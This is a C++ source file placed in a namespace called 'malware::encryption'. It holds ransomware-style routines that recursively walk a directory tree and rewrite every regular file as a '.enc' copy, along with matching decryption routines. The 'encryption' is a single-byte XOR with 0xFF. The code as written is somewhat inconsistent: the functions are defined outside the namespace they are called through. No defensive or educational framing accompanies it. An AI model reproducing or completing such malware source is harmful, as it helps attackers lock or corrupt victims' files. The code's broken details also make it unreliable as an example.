/* encryption.cpp */
#include "encryption.h"
using namespace malware::encryption;

/* Function to encrypt a single file */
void encryptFile(const std::string filePath) {
    std::ifstream inputFile(filePath, std::ios::binary);
    std::ofstream outputFile(filePath + ".enc", std::ios::binary);
    char byte;
    while (inputFile.get(byte)) {
        outputFile.put(byte ^ 0xFF);
    }
    inputFile.close();
    outputFile.close();
}

/* Function to decrypt a single file */
void decryptFile(const std::string filePath) {
    std::ifstream inputFile(filePath, std::ios::binary);
    std::ofstream outputFile(filePath.substr(0, filePath.size() - 4), std::ios::binary);
    char byte;
    while (inputFile.get(byte)) {
        outputFile.put(byte ^ 0xFF);
    }
    inputFile.close();
    outputFile.close();
}

/* Function to encrypt all files in a directory */
void encryptDirectory(const std::string filePath) {
    DIR *dir;
    struct dirent *ent;
    if ((dir = opendir(filePath.c_str())) != NULL) {
        while ((ent = readdir(dir)) != NULL) {
            if (ent->d_type == DT_REG) {
                malware::encryption::encryptFile(filePath + "/" + ent->d_name);
            } else if (ent->d_type == DT_DIR) {
                if (ent->d_name[0] != '.') {
                    malware::encryption::encryptDirectory(filePath + "/" + ent->d_name);
                }
            }
        }
        closedir(dir);
    }
}

/* Function to decrypt all files in a directory */
void decryptDirectory(const std::string filePath) {
    DIR *dir;
    struct dirent *ent;
    if ((dir = opendir(filePath.c_str())) != NULL) {
        while ((ent = readdir(dir)) != NULL) {
            if (ent->d_type == DT_REG) {
                malware::encryption::decryptFile(filePath + "/" + ent->d_name);
            } else if (ent->d_type == DT_DIR) {
                if (ent->d_name[0] != '.') {
                    malware::encryption::decryptDirectory(filePath + "/" + ent->d_name);
                }
            }
        }
        closedir(dir);
    }
}